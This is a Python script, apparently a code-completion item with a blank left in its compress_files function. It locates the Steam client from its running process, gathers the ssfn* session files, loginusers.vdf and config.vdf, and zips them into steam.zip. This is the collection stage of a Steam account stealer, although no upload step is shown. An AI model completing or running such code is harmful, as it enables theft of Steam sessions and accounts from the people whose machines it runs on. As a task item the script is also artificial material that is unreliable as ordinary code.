import os
import zipfile
import subprocess
from pathlib import Path

def find_steam_path():
    """
    Finds the path of the Steam client by searching for the "Steam" process.
    Returns the path to the Steam installation directory.
    """
    try:
        # Use psutil to find the process
        import psutil
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            if 'Steam' in proc.info['name']:
                steam_path = Path(proc.info['cmdline'][0]).parent
                return steam_path
        return None
    except Exception as e:
        print(f"Error finding Steam path: {e}")
        return None

def collect_files(steam_path):
    """
    Collects specific files from the Steam directory.
    Returns a list of paths to the collected files.
    """
    files_to_collect = [
        "ssfn*",
        "config/loginusers.vdf",
        "config/config.vdf"
    ]
    collected_files = []

    for pattern in files_to_collect:
        for file_path in steam_path.glob(pattern):
            collected_files.append(file_path)

    return collected_files

def compress_files(file_paths, output_zip):
    <FILL_HERE>
def main():
    steam_path = find_steam_path()
    if steam_path:
        print(f"Steam path found: {steam_path}")
        files_to_compress = collect_files(steam_path)
        if files_to_compress:
            output_zip = "steam.zip"
            compress_files(files_to_compress, output_zip)
            print(f"Files compressed into {output_zip}")
        else:
            print("No files to compress.")
    else:
        print("Steam path not found.")

if __name__ == "__main__":
    main()